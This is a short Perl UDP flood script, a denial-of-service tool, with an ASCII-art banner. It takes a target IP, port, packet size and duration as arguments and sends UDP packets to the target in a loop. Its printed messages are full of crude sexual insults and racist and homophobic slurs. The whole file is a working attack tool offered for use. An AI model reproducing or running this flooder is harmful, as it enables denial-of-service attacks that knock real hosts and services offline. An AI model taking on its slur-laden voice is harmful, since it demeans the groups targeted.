#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;
 

##
# Ran By Silo AKA Mr. FuckYoBitch
##

use Socket;
use strict;
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
print BOLD GREEN<<EOTEXT;
   ▄████████  ▄█   ▄█        ▄██████▄  
  ███    ███ ███  ███       ███    ███ 
  ███    █▀  ███▌ ███       ███    ███ 
  ███        ███▌ ███       ███    ███ 
▀███████████ ███▌ ███       ███    ███ 
         ███ ███  ███       ███    ███ 
   ▄█    ███ ███  ███▌    ▄ ███    ███ 
 ▄████████▀  █▀   █████▄▄██  ▀██████▀  
                  ▀                    
Coded by: DaddySilo AKA BabyDick
EOTEXT
 
print "Sending packets to asshole $ip " . ($port ? $port : "random") . "
Taste Daddy Silo's Titty Milk " .
  ($size ? "$size byte's" : "Error..") . "
Silo Slapped Yo Queer Ass " .
  ($time ? " for $time seconds" : "") . "\n";
print "Stop Butt Raping coon with CTRL-C" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500000-64)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
$iaddr));}